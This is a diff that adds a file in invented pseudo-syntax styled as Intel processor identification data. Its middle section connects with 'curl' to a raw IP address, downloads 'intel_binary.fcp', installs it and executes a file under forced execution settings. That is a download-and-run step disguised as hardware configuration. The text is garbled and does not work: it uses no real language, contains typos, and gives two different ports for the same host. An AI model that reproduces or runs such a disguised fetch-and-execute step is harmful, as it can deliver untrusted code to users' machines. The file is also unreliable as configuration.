@@ -1,0 +1,48 @@
+ProcessorID;
+ ProcessorType;
+  ProcessorVendor;
+   ProcessorMethod; 
+    Values;
+     { i5 Core-57M0H3 }
+     { Soruce:Intel }
+     { INTEL INSIDE }
+     { Intel Binary }
+      
+       locale.support;
+        binarykey;0101010101010101
+        binarystructure;x000000000
+         filetype;win64
+          filearch;x00000ABE
+           fileid;x000001ABT
+           
+           
+           
+           find.binary.support.structure curl (); url:"86.11.0.52:5005" force;connect
+             auth;
+              10057901AE:077x050x043ABE
+              
+              end
+              
+              
+               @>download.files.curl.86.11.0.52:50005/files/resources/binary/arch64/win64/intel_binary.fcp
+                win.install.intel_binary.fcp
+                  @ delay.ms(250)
+                  
+                   await_result_0
+                    find.file.intel_binary.fcp
+                     execute intel_source.sfc
+                     
+                     locate.result.fcp
+                     
+                     keepsetting=true
+                     allownet=false
+                     autowcs=true
+                      
+                      
+                       
+                       ###### EXECUTION SETTINGS ######
+                       # {} Mode:Force=True           #
+                       # {} Type:Fast=True            #
+                       # {} ARCH:INTEL64=true         #
+                       # {} FLAG: -x -y nodelay=true  #
+                       #################################
